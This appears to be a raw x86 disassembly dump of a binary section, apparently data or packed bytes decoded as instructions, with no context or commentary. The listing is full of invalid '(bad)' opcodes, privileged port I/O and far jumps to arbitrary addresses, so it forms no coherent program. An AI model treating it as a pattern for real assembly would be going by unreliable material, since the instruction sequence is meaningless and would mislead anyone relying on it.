  40913f:	ficomp WORD PTR [edx-0x6c563651]
  409145:	pusha  
  409146:	ins    DWORD PTR es:[edi],dx
  409147:	xchg   BYTE PTR [eax],cl
  409149:	add    BYTE PTR [esi+0x70],dl
  40914c:	dec    ecx
  40914d:	mov    dh,BYTE PTR [edx-0x1fafa1a9]
  409153:	hlt    
  409154:	add    BYTE PTR [esi+0x39],0x7d
  409158:	jmp    0x4091c0
  40915a:	mov    ebx,0xdf7afe8c
  40915f:	push   0xffffffa9
  409161:	ret    0xd785
  409164:	in     eax,dx
  409165:	ds adc ecx,ecx
  409168:	inc    edi
  409169:	arpl   bp,di
  40916b:	loop   0x409124
  40916d:	in     al,0x10
  40916f:	(bad)  
  409170:	push   ds
  409171:	imul   edi,DWORD PTR [ecx+ebx*2],0x19
  409175:	jbe    0x40914d
  409177:	popf   
  409178:	mov    eax,0xe0fa7943
  40917d:	cmc    
  40917e:	jmp    0x8987f15
  409183:	in     eax,dx
  409184:	(bad)  
  409185:	mov    edi,0x409c376
  40918a:	loope  0x409155
  40918c:	cmp    DWORD PTR [ebx],eax
  40918e:	push   esp
  40918f:	inc    eax
  409190:	fld    DWORD PTR [ecx-0x34de624b]
  409196:	std    
  409197:	inc    edi
  409198:	or     DWORD PTR [esi-0x4b],esp
  40919b:	iret   
  40919c:	or     DWORD PTR [edx],ecx
  40919e:	(bad)  
  40919f:	rcr    BYTE PTR [esi],1
  4091a1:	das    
  4091a2:	xchg   ecx,eax
  4091a3:	inc    edi
  4091a4:	inc    ebx
  4091a5:	cmp    DWORD PTR [eax],0xffffff8d
  4091a8:	sub    ebp,DWORD PTR cs:[edx-0x6136926a]
  4091af:	sub    esi,ebp
  4091b1:	lds    edi,FWORD PTR [eax]
  4091b3:	fisub  DWORD PTR [esi+0x7]
  4091b6:	mov    esp,0xe3e90029
  4091bb:	mov    al,ds:0x74929e31
  4091c0:	jg     0x409149
  4091c2:	add    ebp,DWORD PTR [edx-0x4a]
  4091c5:	adc    al,0x2f
  4091c7:	(bad)  
  4091c8:	(bad)  
  4091c9:	cmp    DWORD PTR [edi+0x2292fe8e],ebp
  4091cf:	int    0x9a
  4091d1:	inc    edi
  4091d2:	repnz adc BYTE PTR [esi-0x998196f],bh
  4091d9:	jo     0x40923e
  4091db:	dec    ebx
  4091dc:	xchg   edi,eax
  4091dd:	mov    esi,0xc3efcf3d
  4091e2:	std    
  4091e3:	mov    dl,0x91
  4091e5:	out    0x9a,eax
  4091e7:	and    eax,0x5a3a3ab2
  4091ec:	inc    edi
  4091ed:	mov    ch,0x82
  4091ef:	shl    BYTE PTR [ebp-0x77df6ee],0x57
  4091f6:	pop    eax
  4091f7:	and    al,dh
  4091f9:	cmc    
  4091fa:	leave  
  4091fb:	mov    dh,0x93
  4091fd:	mov    esi,0x652430c8
  409202:	popf   
  409203:	in     eax,dx
  409204:	add    dl,bl
  409206:	mov    edx,0xfce8f74a
  40920b:	iret   
  40920c:	and    ah,BYTE PTR [eax+0x79]
  40920f:	inc    edx
  409210:	mov    dl,0x5c
  409212:	lea    ecx,[edx+0x225e0170]
  409218:	pop    edx
  409219:	jl     0x4091ca
  40921b:	sub    eax,0xffffffaf
  40921e:	or     BYTE PTR [edi-0xa],ah
  409221:	push   ebx
  409222:	dec    ecx
  409223:	adc    al,0x4f
  409225:	mov    eax,ds:0xb117440
  40922a:	push   ebx
  40922b:	ror    DWORD PTR [ebp*4+0x1911d0cb],cl
  409232:	(bad)  
  409233:	lahf   
  409234:	mov    ds:0x195d1d33,eax
  409239:	dec    ebp
  40923a:	inc    ecx
  40923b:	repnz shl DWORD PTR [ebx],0xdb
  40923f:	inc    ebp
  409240:	sub    eax,0x829aa9b4
  409245:	dec    esi
  409246:	aad    0x25
  409248:	xor    eax,0x53a56964
  40924d:	lahf   
  40924e:	lods   al,BYTE PTR ds:[esi]
  40924f:	adc    edx,DWORD PTR [esi+0xf08a3ee]
  409255:	jnp    0x4092a6
  409257:	int3   
  409258:	push   0x77
  40925a:	test   al,0x88
  40925c:	and    eax,0xcbe26cfa
  409261:	fist   DWORD PTR [edx-0x4b5f59de]
  409267:	xchg   ebp,eax
  409268:	out    dx,al
  409269:	ins    BYTE PTR es:[edi],dx
  40926a:	jno    0x4092dd
  40926c:	data16 addr16 jl 0x4091fd
  409270:	enter  0x1215,0x35
  409274:	xchg   DWORD PTR ds:0xcc4c93c7,edx
  40927a:	(bad)  
  40927c:	push   edx
  40927d:	aaa    
  40927e:	adc    ch,al
  409280:	dec    edx
  409281:	fdiv   DWORD PTR [ebx+ecx*2-0x36a4a37e]
  409288:	leave  
  409289:	inc    ebx
  40928a:	cmp    al,0xcf
  40928c:	dec    eax
  40928d:	xchg   esi,eax
  40928e:	dec    edx
  40928f:	sub    BYTE PTR ds:0x664205a3,al
  409295:	mov    ebp,0x8afaecfa
  40929a:	or     ch,BYTE PTR [edx-0xc]
  40929d:	shr    DWORD PTR es:[edi+edx*2],0xfc
  4092a2:	mov    fs,WORD PTR ds:0xd2598a58
  4092a8:	pop    ecx
  4092a9:	cmp    esi,DWORD PTR [ebx]
  4092ab:	push   ss
  4092ac:	test   DWORD PTR [ecx+0x35],eax
  4092af:	sub    ecx,ecx
  4092b1:	mov    ebp,0x81c2a481
  4092b6:	ins    DWORD PTR es:[edi],dx
  4092b7:	scas   eax,DWORD PTR es:[edi]
  4092b8:	mov    ebp,0x93d7989
  4092bd:	pop    ecx
  4092be:	jmp    DWORD PTR es:[ebp-0x7]
  4092c2:	sar    bl,cl
  4092c4:	aam    0xd3
  4092c6:	mov    dh,0x3d
  4092c8:	cmp    cl,ch
  4092ca:	mov    ebx,0xd5e39b65
  4092cf:	lds    esp,FWORD PTR [edi+0x23]
  4092d2:	jae    0x4092ea
  4092d4:	pop    ebx
  4092d5:	mov    dh,0x2b
  4092d7:	ja     0x409316
  4092d9:	xchg   edi,eax
  4092da:	inc    esp
  4092db:	cmc    
  4092dc:	inc    ebx
  4092dd:	jg     0x4092a8
  4092df:	jmp    0x3f53:0x69d7b643
  4092e6:	ins    DWORD PTR es:[edi],dx
  4092e7:	call   FWORD PTR [eax+ecx*4]
  4092ea:	dec    eax
  4092eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092ec:	into   
  4092ed:	adc    DWORD PTR [esi-0x18],ebp
  4092f0:	popa   
  4092f1:	clc    
  4092f2:	mov    dl,0x85
  4092f4:	cmp    BYTE PTR [edi+0x34],al
  4092f7:	sub    DWORD PTR [eax+0x5b],eax
  4092fa:	cmp    eax,0xae8eab60
  4092ff:	add    ebp,0x1c722543
  409305:	dec    esp
  409306:	xor    dh,BYTE PTR [esi-0x6d8faff6]
  40930c:	dec    ebx
  40930d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40930e:	jecxz  0x409300
  409310:	or     eax,0xd33461ca
  409315:	dec    ebx
  409316:	adc    ah,0xce
  409319:	(bad)  
  40931a:	hlt    
  40931b:	pop    ds
  40931c:	es mov edi,0xe453ba7d
  409322:	xchg   esp,eax
  409323:	push   ss
  409324:	sbb    al,0x2e
  409326:	lea    esp,[esi-0x6684f56f]
  40932c:	jbe    0x4092f5
  40932e:	inc    edx
  40932f:	mov    ah,BYTE PTR [ebx-0x2c]
  409332:	adc    BYTE PTR [ecx],0x1c
  409335:	push   ebp
  409336:	adc    edx,DWORD PTR [edx-0x63]
  409339:	iret   
  40933a:	cdq    
  40933b:	into   
  40933c:	mov    eax,gs:0xba976a6c
  409342:	mov    edi,0x7a86df86
  409347:	imul   esp,DWORD PTR [esi],0xcdb7eb3c
  40934d:	mov    WORD PTR [ecx-0x14],cs
  409350:	int3   
  409351:	adc    al,0x52
  409353:	sub    eax,0x315cae56
  409358:	leave  
  409359:	add    DWORD PTR [ecx+eiz*8-0x49],ecx
  40935d:	fcom   DWORD PTR [ebx]
  40935f:	test   al,0x6b
  409361:	mul    DWORD PTR [ecx+0x7c]
  409364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409365:	arpl   WORD PTR [edi+0x5f59ce7a],dx
  40936b:	fisubr DWORD PTR [esi-0x64]
  40936f:	mov    ds:0x9b37d3d3,al
  409374:	jg     0x409369
  409376:	cdq    
  409377:	mov    bh,0xa3
  409379:	add    DWORD PTR [eax],0x5e440ab5
  40937f:	addr16 or al,0xb2
  409382:	add    al,0x92
  409384:	xor    BYTE PTR [esi],cl
  409386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409387:	stc    
  409388:	daa    
  409389:	push   ds
  40938a:	inc    ch
  40938c:	mov    edi,0x73cfc28f
  409391:	(bad)  
  409392:	push   edx
  409393:	sbb    ebp,ebp
  409395:	or     dl,BYTE PTR ds:0x1dabb367
  40939b:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40939d:	mov    eax,ds:0x8503189
  4093a2:	aam    0xe3
  4093a4:	pop    eax
  4093a5:	mov    dh,0xa5
  4093a7:	(bad)  
  4093a8:	mov    ecx,0xf4fd0c74
  4093ad:	scas   al,BYTE PTR es:[edi]
  4093ae:	lds    ebp,FWORD PTR [eax-0x35df803]
  4093b4:	inc    esp
  4093b5:	xor    eax,0x80117daa
  4093ba:	je     0x4093e1
  4093bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093be:	pop    ds
  4093bf:	xor    BYTE PTR ds:0x9a141670,dl
  4093c5:	sbb    al,0x86
  4093c7:	push   es
  4093c8:	mov    bh,0xcd
  4093ca:	adc    dh,ah
  4093cc:	imul   ebx,edx,0xd63e8a12
  4093d2:	pop    ecx
  4093d3:	xchg   edi,eax
  4093d4:	cld    
  4093d5:	and    cl,BYTE PTR [esi+ebp*8]
  4093d8:	sbb    bh,dl
  4093da:	ja     0x409363
  4093dc:	inc    ecx
  4093dd:	js     0x4093f9
  4093df:	adc    dh,dh
  4093e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093e2:	fwait
  4093e3:	iret   
  4093e4:	out    0x6,eax
  4093e6:	je     0x409442
  4093e8:	aas    
  4093e9:	dec    ebx
  4093ea:	mov    ebx,0xdc722b26
  4093ef:	jbe    0x409374
  4093f1:	arpl   WORD PTR [ecx-0x3f71a9d6],dx
  4093f7:	pop    ss
  4093f8:	fisttp WORD PTR [edx+edx*2]
  4093fb:	ds call 0x655a:0xebeb6694
  409403:	das    
  409404:	xchg   esp,eax
  409405:	mov    al,ds:0xb169408f
  40940a:	stc    
  40940b:	jl     0x4093d6
  40940d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40940e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40940f:	pop    ss
  409410:	adc    al,dl
  409412:	dec    edi
  409413:	cmc    
  409414:	inc    esi
  409415:	fdivr  QWORD PTR [edx+edx*2+0x1e]
  409419:	mov    dl,0x4f
  40941b:	cmc    
  40941c:	adc    eax,0xe406136f
  409421:	mov    dh,0x8c
  409423:	xlat   BYTE PTR ds:[ebx]
  409424:	and    ch,dl
  409426:	test   esp,ecx
  409428:	js     0x409480
  40942a:	paddsw mm6,QWORD PTR [eax+0x639fbf39]
  409431:	xor    eax,0x366427f0
  409436:	mov    bl,0x31
  409438:	out    dx,eax
  409439:	imul   edi,DWORD PTR [edx-0x5c84eafb],0x1b6576e2
  409443:	leave  
  409444:	push   ebp
  409445:	sub    esp,DWORD PTR [eax+0x57]
  409448:	xchg   esi,eax
  409449:	mov    bl,0xdc
  40944b:	jle    0x40946b
  40944d:	pop    ss
  40944e:	inc    ebp
  40944f:	js     0x40940e
  409451:	xlat   BYTE PTR ds:[ebx]
  409452:	push   0x8fdbadef
  409457:	es stos DWORD PTR es:[edi],eax
  409459:	out    dx,eax
  40945a:	push   0xffffffa2
  40945c:	mov    WORD PTR [esi],fs
  40945e:	xchg   ebp,eax
  40945f:	sub    BYTE PTR [esi+0x38],bl
  409462:	mov    cl,0xd8
  409464:	fwait
  409465:	in     al,0xcc
  409467:	xchg   ecx,eax
  409468:	xor    al,0x6
  40946a:	pusha  
  40946b:	push   ds
  40946c:	std    
  40946d:	dec    DWORD PTR [esi]
  40946f:	push   0x56
  409471:	pop    ebp
  409472:	mov    cl,0x3a
  409474:	and    al,0x69
  409476:	mov    eax,0xb0d57cf1
  40947b:	xor    eax,0x7b14d33f
  409480:	push   esp
  409481:	xchg   ebp,eax
  409482:	cmp    edi,0x31
  409485:	stc    
  409486:	out    0x25,eax
  409488:	ret    0xa59c
  40948b:	daa    
  40948c:	cmp    edi,esi
  40948e:	adc    al,dl
  409490:	jle    0x409466
  409492:	xor    ecx,DWORD PTR [edi]
  409494:	mov    bh,0xbc
  409496:	lahf   
  409497:	dec    edi
  409498:	sbb    ebx,0x228b91e6
  40949e:	and    al,0x50
  4094a0:	add    DWORD PTR [edx-0x35f736fc],0xdc5832b3
  4094aa:	(bad)
  4094ad:	dec    edi
  4094ae:	imul   ebx,ecx,0x6
  4094b1:	adc    ah,BYTE PTR [eax+0x2ee1a4fc]
  4094b7:	outs   dx,DWORD PTR ds:[esi]
  4094b8:	outs   dx,DWORD PTR ds:[esi]
  4094b9:	mov    ds:0x30e0bd30,eax
  4094be:	dec    edi
  4094bf:	cdq    
  4094c0:	xor    ecx,DWORD PTR ds:0xa217db0f
  4094c6:	and    al,0x87
  4094c8:	addr16 sti 
  4094ca:	pushf  
  4094cb:	or     eax,0x624b42ad
  4094d0:	cwde   
  4094d1:	pop    fs
  4094d3:	imul   esp,eax,0x39
  4094d6:	in     al,dx
  4094d7:	pusha  
  4094d8:	xchg   ebp,esi
  4094da:	dec    ebx
  4094db:	nop
  4094dc:	ror    DWORD PTR [esi+0x59],cl
  4094df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094e0:	xchg   ebx,eax
  4094e1:	mov    esi,DWORD PTR [edi-0x77140201]
  4094e7:	adc    DWORD PTR [edi-0x4eb84fa2],ebp
  4094ed:	dec    esi
  4094ee:	call   0xcedba139
  4094f3:	ins    DWORD PTR es:[edi],dx
  4094f4:	mov    BYTE PTR [edx-0x23272013],0x6e
  4094fb:	das    
  4094fc:	sub    BYTE PTR [edi],al
  4094fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ff:	fucomp st(1)
  409501:	fidivr WORD PTR [edx-0x3a]
  409504:	mov    dl,0xe0
  409506:	imul   ebx,DWORD PTR [eax-0xf6d040],0xffffff95
  40950d:	mov    bh,0x20
  40950f:	jo     0x4094ef
  409511:	jle    0x409543
  409513:	or     DWORD PTR [eax-0xf],0x49
  409517:	push   esp
  409518:	dec    ecx
  409519:	and    eax,0x4a7f60e0
  40951e:	xchg   DWORD PTR [ebp+0x7f733680],eax
  409524:	cmp    ch,0xa5
  409527:	shl    BYTE PTR [ebx+0x5ad4a326],0x6
  40952e:	repz xor DWORD PTR [ecx-0x78cb0fcf],edx
  409535:	and    DWORD PTR [esp+edi*8],eax
  409538:	or     BYTE PTR [ecx+eax*1],bl
  40953b:	shr    DWORD PTR [edx],1
  40953d:	sub    BYTE PTR [edx-0x31896bbd],dl
  409543:	aaa    
  409544:	inc    ebp
  409545:	sbb    BYTE PTR [edi-0x1c],0xa4
  409549:	and    BYTE PTR [edx],dl
  40954b:	pop    esp
  40954c:	in     eax,0x20
  40954e:	or     BYTE PTR [eax+0x32262cdd],bh
  409554:	push   0xffffffbf
  409556:	pop    edi
  409557:	lds    eax,FWORD PTR [eax-0x49]
  40955a:	out    0x94,eax
  40955c:	mov    dh,0x40
  40955e:	call   0xac07:0x447400b3
  409565:	and    al,0xe3
  409567:	lock adc ebx,DWORD PTR [edx-0x69]
  40956b:	mov    ds:0xaf21a25a,eax
  409570:	bound  ebp,QWORD PTR [ecx-0x5fd1896d]
  409576:	daa    
  409577:	sub    al,0xe2
  409579:	(bad)  ds:0xcba3b03b
  40957f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409580:	pop    esi
  409581:	scas   eax,DWORD PTR es:[edi]
  409582:	shl    DWORD PTR [ebx+eax*4],0x7
  409586:	mov    ds:0x70cecc7f,eax
  40958b:	leave  
  40958c:	call   0x3c6a99a6
  409591:	mov    al,ds:0x656e1a71
  409596:	(bad)
  409599:	sti    
  40959a:	pusha  
  40959b:	xchg   edi,eax
  40959c:	retf   0x2b80
  40959f:	cdq    
  4095a0:	mov    al,0xdc
  4095a2:	call   0x275b9117
  4095a7:	mov    ds:0xa73b00ad,eax
  4095ac:	int    0x52
  4095ae:	add    edi,DWORD PTR [ebx]
  4095b0:	dec    edx
  4095b1:	(bad)  
  4095b2:	test   esp,0x1d1ee52
  4095b8:	jnp    0x40955a
  4095ba:	popf   
  4095bb:	imul   eax,ecx,0xffffff8d
  4095be:	retf   0xf828
  4095c1:	fnstsw WORD PTR [esi-0x7598f04c]
  4095c7:	test   DWORD PTR ds:0xed027c45,ebx
  4095cd:	add    BYTE PTR [eax+0x39],ch
  4095d0:	(bad)  
  4095d1:	mov    dl,0x30
  4095d3:	mov    ecx,0x653aa2dc
  4095d8:	sahf   
  4095d9:	add    al,0x41
  4095db:	sti    
  4095dc:	lahf   
  4095dd:	push   0xb9695e73
  4095e2:	mov    gs,ebx
  4095e4:	inc    DWORD PTR [ecx+0x6132d3ef]
  4095ea:	fbstp  TBYTE PTR [ebp-0x72]
  4095ed:	cmp    al,cl
  4095ef:	out    dx,eax
  4095f0:	mov    ebx,0x66c65b57
  4095f5:	jnp    0x409584
  4095f7:	push   esi
  4095f8:	pop    eax
  4095f9:	jg     0x40960b
  4095fb:	dec    esi
  4095fc:	imul   ebp,DWORD PTR [eax-0x16],0xe1852f40
  409603:	pop    es
  409604:	jle    0x40965e
  409606:	call   0xe0ea:0x12670b40
  40960d:	(bad)  
  40960e:	icebp  
  40960f:	test   eax,0xd8302745
  409614:	mov    ecx,0x3cb49385
  409619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40961a:	mov    ecx,0xc67e276e
  40961f:	add    eax,0xa1d14350
  409624:	mov    ebp,0xcb8a8ab6
  409629:	test   al,0xaf
  40962b:	daa    
  40962c:	mov    WORD PTR [eax+0xc],?
  40962f:	cmp    cl,ah
  409631:	pop    ecx
  409632:	or     DWORD PTR [edi+0x51017ba1],0xa2cb6eb0
  40963c:	fsubr  QWORD PTR [ecx]
  40963e:	add    BYTE PTR [ecx+0x30a7c883],ah
  409644:	inc    ecx
  409645:	dec    eax
  409646:	push   ebp
  409647:	in     eax,0x19
  409649:	pop    edx
  40964a:	or     ebx,ebp
  40964c:	add    DWORD PTR ss:[ebp+0x939367d],esp
  409653:	imul   edx,DWORD PTR [esi+0x2a8f5069],0x27
  40965a:	addr16 std 
  40965c:	add    DWORD PTR [edx-0x681be988],ebx
  409662:	outs   dx,DWORD PTR ds:[esi]
  409663:	jo     0x4096d6
  409665:	mov    edi,0xac3e6be4
  40966a:	out    dx,eax
  40966b:	add    al,0x5e
  40966d:	cld    
  40966e:	xchg   esi,eax
  40966f:	mov    al,bh
  409671:	sbb    al,0xe1
  409673:	shl    dh,1
  409675:	dec    ecx
  409676:	cmp    eax,0xf3adae62
  40967b:	imul   ebx,DWORD PTR fs:[eax],0xfbf1dba4
  409682:	mov    dl,0x34
  409684:	pusha  
  409685:	and    al,0xc1
  409687:	mov    edx,0x83cb3ab9
  40968c:	dec    ebx
  40968d:	addr16 icebp 
  40968f:	fimul  DWORD PTR [edi-0x63e851ce]
  409695:	add    eax,0x54bb2c12
  40969a:	add    ch,bl
  40969c:	shl    BYTE PTR [eax],cl
  40969e:	pop    esp
  40969f:	inc    edx
  4096a0:	hlt    
  4096a1:	mov    ah,0x14
  4096a3:	call   0x5ed9c948
  4096a8:	and    ebx,eax
  4096aa:	cmp    bl,BYTE PTR [esp+ecx*4]
  4096ad:	mov    ah,0xb1
  4096af:	jmp    0x409684
  4096b1:	xchg   BYTE PTR [ebx],bh
  4096b3:	jmp    0x409703
  4096b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096b6:	int    0xaa
  4096b8:	fwait
  4096b9:	loop   0x40968b
  4096bb:	dec    ebx
  4096bc:	int    0xd1
  4096be:	or     al,0xa3
  4096c0:	mov    ah,0xbe
  4096c2:	mov    ds:0x8e65d7a9,eax
  4096c7:	(bad)  
  4096c8:	cmp    DWORD PTR [eax+0x254e9391],edx
  4096ce:	pop    ecx
  4096cf:	in     al,0xeb
  4096d1:	mov    eax,0x930b270b
  4096d6:	test   eax,0xe51ae15a
  4096db:	popa   
  4096dc:	pop    edi
  4096dd:	xor    BYTE PTR [edx+0x7],cl
  4096e0:	int    0xca
  4096e2:	out    0xcb,al
  4096e4:	mov    bh,0x95
  4096e6:	adc    ah,bh
  4096e8:	ffree  st(1)
  4096ea:	ja     0x40974b
  4096ec:	fnsave [ebx]
  4096ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ef:	xor    DWORD PTR [ebx-0x79],ebx
  4096f2:	sub    DWORD PTR [ebx],ebx
  4096f4:	das    
  4096f5:	pop    esi
  4096f6:	scas   eax,DWORD PTR es:[edi]
  4096f7:	fldenv [eax+0x484f1b5a]
  4096fd:	in     eax,0xfc
  4096ff:	js     0x409723
  409701:	xor    eax,0x3106faf9
  409706:	test   eax,0x86466c09
  40970b:	pop    edx
  40970c:	fdivr  st(5),st
  40970e:	arpl   bx,ax
  409710:	sahf   
  409711:	xlat   BYTE PTR ds:[ebx]
  409712:	(bad)  [ebx]
  409714:	pop    eax
  409715:	xor    al,0xe2
  409717:	imul   esi,DWORD PTR [edi+eax*8-0x15],0xffffffe3
  40971c:	adc    edx,DWORD PTR [ebp-0x7d]
  40971f:	push   cs
  409720:	cli    
  409721:	adc    dl,BYTE PTR [edx+0x8]
  409724:	(bad)  
  409725:	cwde   
  409726:	cmp    eax,0xafe85745
  40972b:	jbe    0x4097a4
  40972d:	mov    ah,0x6d
  40972f:	add    edx,DWORD PTR [ecx-0x42]
  409732:	nop
  409733:	(bad)  ds:0x9c3b684
  409739:	sahf   
  40973a:	pop    edi
  40973b:	jns    0x409767
  40973d:	push   edi
  40973e:	mov    ds:0x4501a92f,al
  409744:	fdiv   QWORD PTR ds:0x65be412b
  40974a:	mov    eax,0x99a358b9
  40974f:	and    eax,0x685c8267
  409754:	cmp    esi,esi
  409756:	xchg   DWORD PTR [ebx+0x26],edi
  409759:	pop    esp
  40975a:	loopne 0x40974f
  40975c:	rcl    DWORD PTR [edi+0x1e7dc116],cl
  409762:	cmp    DWORD PTR [eax],edx
  409764:	mov    esp,0x1035743
  409769:	and    BYTE PTR [ecx-0x5076381c],dh
  40976f:	mov    ah,0xf4
  409771:	mov    ebx,cs
  409773:	cld    
  409774:	sub    eax,0xf01ee6b9
  409779:	mov    al,0xe3
  40977b:	nop
  40977c:	imul   edx,DWORD PTR [eax-0x132f6e67],0x2c
  409783:	lods   al,BYTE PTR ds:[esi]
  409784:	mov    dl,0x5d
  409786:	push   ebp
  409787:	sbb    ch,dh
  409789:	ins    DWORD PTR es:[edi],dx
  40978a:	aas    
  40978b:	push   cs
  40978c:	xchg   ebx,eax
  40978d:	std    
  40978e:	add    bl,BYTE PTR [ecx+0x1d70e932]
  409794:	repnz or BYTE PTR [ebx-0x70],bh
  409798:	add    ecx,eax
  40979a:	push   DWORD PTR [esi-0x62]
  40979d:	das    
  40979e:	or     bl,BYTE PTR [edi+ebx*2]
  4097a1:	cwde   
  4097a2:	cmp    DWORD PTR [edx-0x7294db1a],esi
  4097a8:	push   eax
  4097a9:	dec    eax
  4097aa:	rcl    DWORD PTR [edi+edi*4+0x3aaefac8],0x9e
  4097b2:	ror    BYTE PTR ds:0x3a4f8711,cl
  4097b8:	sbb    DWORD PTR [edx],ecx
  4097ba:	shr    DWORD PTR ds:0x6891df01,1
  4097c0:	inc    DWORD PTR [edx+eax*4+0x35]
  4097c4:	loopne 0x409821
  4097c6:	dec    edi
  4097c7:	loopne 0x4097c5
  4097c9:	cmp    DWORD PTR [ebx],ecx
  4097cb:	push   ecx
  4097cc:	mov    fs,WORD PTR [ecx+0x28a5a7c3]
  4097d2:	cmp    ah,BYTE PTR [eax-0x4fda29cf]
  4097d8:	ds push edx
  4097da:	addr16 jmp 0x4add872f
  4097e0:	adc    ecx,esp
  4097e2:	scas   eax,DWORD PTR es:[edi]
  4097e3:	mov    ds:0x25c28216,al
  4097e8:	dec    ebp
  4097e9:	inc    ecx
  4097ea:	cdq    
  4097eb:	test   BYTE PTR [esi-0x1edbe0c7],ch
  4097f1:	mov    ?,WORD PTR [ecx+0x5d]
  4097f4:	jne    0x4097d8
  4097f6:	mov    ds:0xf474477a,al
  4097fb:	cli    
  4097fc:	and    cl,bh
  4097fe:	sbb    ebx,eax
  409800:	sub    ecx,0x884ffb9b
  409806:	shr    dh,cl
  409808:	mov    eax,ds:0xc7d92c24
  40980d:	(bad)  
  40980e:	and    al,0xbb
  409810:	mov    ecx,0xb8b87ab4
  409815:	push   esi
  409816:	mov    dh,0x8f
  409818:	stos   BYTE PTR es:[edi],al
  409819:	pop    es
  40981a:	loopne 0x4097ef
  40981c:	aam    0x5b
  40981e:	pushf  
  40981f:	imul   esi,DWORD PTR [ebx+eax*1],0x63a7278e
  409826:	cmp    cl,BYTE PTR [eax]
  409828:	popa   
  409829:	loop   0x40986e
  40982b:	cmp    ch,BYTE PTR [ecx-0x61959e15]
  409831:	repnz push ss
  409833:	pop    eax
  409834:	pop    eax
  409835:	je     0x4097b8
  409837:	sbb    dl,ah
  409839:	pop    ebx
  40983a:	pop    es
  40983b:	mov    ebp,0xf65b76a7
  409841:	dec    ebp
  409842:	xor    DWORD PTR [edx],edi
  409844:	shl    DWORD PTR [edx],0x49
  409847:	inc    edx
  409848:	shr    BYTE PTR [edx-0x49],0xec
  40984c:	lea    edx,[eax]
  40984e:	push   ecx
  40984f:	mov    ebx,fs
  409851:	pop    ss
  409852:	in     eax,0x9
  409854:	out    dx,eax
  409855:	sub    ebp,ecx
  409857:	add    DWORD PTR [ebx-0x235b7ae6],ecx
  40985d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40985e:	cli    
  40985f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409860:	mov    esp,0x7676647d
  409865:	int    0x53
  409867:	jnp    0x409819
  409869:	and    al,0xf9
  40986b:	ins    DWORD PTR es:[edi],dx
  40986c:	jp     0x40988a
  40986e:	cmp    ah,BYTE PTR [esp+ebp*8-0x38]
  409872:	(bad)  
  409873:	mov    ebp,0x915339b9
  409878:	lods   eax,DWORD PTR ds:[si]
  40987a:	push   ebx
  40987b:	and    BYTE PTR [ecx+edi*4-0x39],al
  40987f:	retf   
  409880:	out    0x8d,al
  409882:	loopne 0x409877
  409884:	iret   
  409885:	pop    esp
  409886:	mov    WORD PTR [edi-0x3e],?
  409889:	test   al,0xa7
  40988b:	mov    eax,ds:0x8b14fc0f
  409890:	or     ecx,DWORD PTR [edi-0x22ee463e]
  409896:	(bad)  
  409897:	nop
  409898:	js     0x4098e5
  40989a:	in     al,dx
  40989b:	cmp    eax,0x240923ef
  4098a0:	xchg   ecx,eax
  4098a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a2:	mov    al,ds:0x1596f39
  4098a7:	inc    esi
  4098a8:	ins    BYTE PTR es:[edi],dx
  4098a9:	in     eax,0xed
  4098ab:	repz cmp al,0xfb
  4098ae:	test   BYTE PTR gs:[eax+0x400495cb],dh
  4098b5:	push   ds
  4098b6:	dec    ebx
  4098b7:	cmp    DWORD PTR [ecx],0x59f248cb
  4098bd:	or     BYTE PTR [ebp-0x7b],dh
  4098c0:	loope  0x40993f
  4098c2:	ja     0x409861
  4098c4:	xor    eax,DWORD PTR [ecx]
  4098c6:	dec    eax
  4098c7:	out    dx,al
  4098c8:	imul   ecx,DWORD PTR [eax+ebp*8-0xb],0xd2c2a49
  4098d0:	mov    dh,0xf7
  4098d2:	das    
  4098d3:	popf   
  4098d4:	push   edx
  4098d5:	push   eax
  4098d6:	ja     0x4098a5
  4098d8:	adc    DWORD PTR [ebp-0x2b4f04b1],ecx
  4098de:	or     dl,BYTE PTR [edi+0x74]
  4098e1:	sar    ah,cl
  4098e3:	inc    ebp
  4098e4:	lahf   
  4098e5:	(bad)  [ebp+0x8252d70]
  4098eb:	push   es
  4098ec:	iret   
  4098ed:	fidiv  WORD PTR [ecx-0x3c1079fe]
  4098f3:	dec    eax
  4098f4:	mov    bh,0xe
  4098f6:	(bad)  
  4098f7:	jbe    0x40990c
  4098f9:	jne    0x40992a
  4098fb:	pop    ecx
  4098fc:	cmp    BYTE PTR ds:0xbe72b2c9,ah
  409902:	mov    ds:0xf8b43baf,eax
  409907:	dec    eax
  409908:	retf   0x1cef
  40990b:	sbb    al,0x32
  40990d:	jno    0x4098b7
  40990f:	sub    edx,DWORD PTR [edi-0x5b]
  409912:	push   esi
  409913:	inc    edi
  409914:	pop    edx
  409915:	and    eax,0x9d72c5dd
  40991a:	out    dx,eax
  40991b:	stc    
  40991c:	mov    dh,0x67
  40991e:	mov    ?,WORD PTR [eax+0x5a]
  409921:	aad    0xca
  409923:	in     al,0x22
  409925:	sbb    DWORD PTR [esi-0x66],eax
  409928:	jne    0x4098e1
  40992a:	hlt    
  40992b:	inc    ebx
  40992c:	fimul  DWORD PTR [edi+edx*1]
  40992f:	aad    0xfe
  409931:	xor    bh,BYTE PTR [ebp+0x30]
  409934:	dec    esi
  409935:	inc    ebx
  409936:	sub    dl,BYTE PTR [eax+0x36]
  409939:	or     edx,ebx
  40993b:	ins    BYTE PTR es:[edi],dx
  40993c:	fsubp  st(5),st
  40993e:	popf   
